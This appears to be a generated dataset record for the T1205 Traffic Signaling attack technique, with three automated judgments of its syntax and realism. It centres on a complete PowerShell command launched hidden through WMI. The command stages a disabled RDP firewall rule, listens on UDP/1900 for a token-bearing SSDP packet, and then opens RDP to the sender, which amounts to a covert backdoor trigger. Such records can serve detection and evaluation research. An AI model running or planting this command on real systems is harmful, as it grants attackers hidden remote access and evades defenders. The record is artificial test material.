command: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-RDP-SSDP'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-RDP-SSDP'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-RDP-SSDP'' -Enabled False }; $u=New-Object System.Net.Sockets.UdpClient(1900); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); $s=[Text.Encoding]::ASCII.GetString($d); if(($s -like ''*M-SEARCH*'') -and ($s -like ''*ST: urn:schemas-upnp-org:device:InternetGatewayDevice:1*'') -and ($s -like ''*X-Token: abc123*'')){ Set-NetFirewallRule -DisplayName ''Signal-Open-RDP-SSDP'' -Enabled True -RemoteAddress $ep.Address; break } } }'
explanation: Inspects SSDP discovery traffic on UDP/1900 for a crafted M-SEARCH request with a specific ST target and custom header token. This UPnP/SSDP-format signal toggles RDP firewall allowance for the sender.
rationale_steps: Create disabled firewall rule for TCP/3389.
Listen on UDP/1900 and parse ASCII SSDP headers for ST and token.
Enable the firewall rule when the crafted M-SEARCH is received.

llm_judgments.syntactic_justification: Balanced quotes/braces with correctly escaped single quotes and valid Invoke-WmiMethod/Create and PowerShell parameters render the command parseable.
llm_judgments.semantic_justification: It embodies Traffic Signaling by listening for a crafted SSDP M-SEARCH to toggle an RDP firewall rule, but practical execution is hindered by likely need for admin rights and failure to bind/receive multicast on UDP/1900 without proper socket options/group join.

llm_judgments.syntactic_justification: The command is largely well-formed with properly nested quotes (using doubled single-quotes inside the outer single-quoted ArgumentList string) and balanced braces/parentheses, though the complex multi-level quoting within Invoke-WmiMethod's ArgumentList string creates edge cases that could cause parsing failures in some environments.
llm_judgments.semantic_justification: The command accurately implements T1205 Traffic Signaling by listening on UDP/1900 for crafted SSDP M-SEARCH packets containing a specific ST field and custom X-Token header as a covert trigger, then dynamically enabling a pre-staged RDP firewall rule scoped to the sender's IP — a realistic and operationally coherent port-knocking/traffic-signaling mechanism for conditional RDP access.

llm_judgments.syntactic_justification: The command is perfectly well-formed, using correct PowerShell syntax, properly escaped nested single quotes for the WMI argument, and balanced delimiters.
llm_judgments.semantic_justification: The command effectively implements traffic signaling using the SSDP protocol to trigger a firewall change; however, it requires administrative privileges (contrary to the 'None' tag) and would likely encounter a port conflict if the native SSDP Discovery service is running.
